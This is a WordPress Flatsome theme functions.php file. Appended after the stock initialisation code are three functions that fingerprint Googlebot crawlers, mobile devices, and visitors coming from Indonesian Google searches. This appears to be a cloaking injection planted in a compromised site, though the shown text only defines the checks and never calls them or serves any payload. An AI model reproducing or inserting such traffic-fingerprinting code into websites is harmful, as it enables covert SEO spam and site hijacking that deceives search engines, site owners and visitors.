<?php
/**
 * Flatsome functions and definitions
 *
 * @package flatsome
 */

require get_template_directory() . '/inc/init.php';

flatsome()->init();

/**
 * It's not recommended to add any custom code here. Please use a child theme
 * so that your customizations aren't lost during updates.
 *
 * Learn more here: https://developer.wordpress.org/themes/advanced-topics/child-themes/
 */

function is_google_bot() {
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
        foreach ($google_agents as $agent) {
            if (stripos($user_agent, $agent) !== false) {
                return true;
            }
        }
    }
    return false;
}

function is_mobile_device() {
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $mobile_agents = ['mobile', 'android', 'iphone', 'ipad', 'blackberry', 'windows phone'];
        foreach ($mobile_agents as $agent) {
            if (strpos($user_agent, $agent) !== false) {
                return true;
            }
        }
    }
    return false;
}

function is_from_indonesia_and_google() {
    if (isset($_SERVER['HTTP_REFERER']) && isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $referer = $_SERVER['HTTP_REFERER'];
        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
        if ((strpos($referer, 'google.co.id') !== false || 
            (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) && 
            is_mobile_device()) {
            return true;
        }
    }
    return false;
}
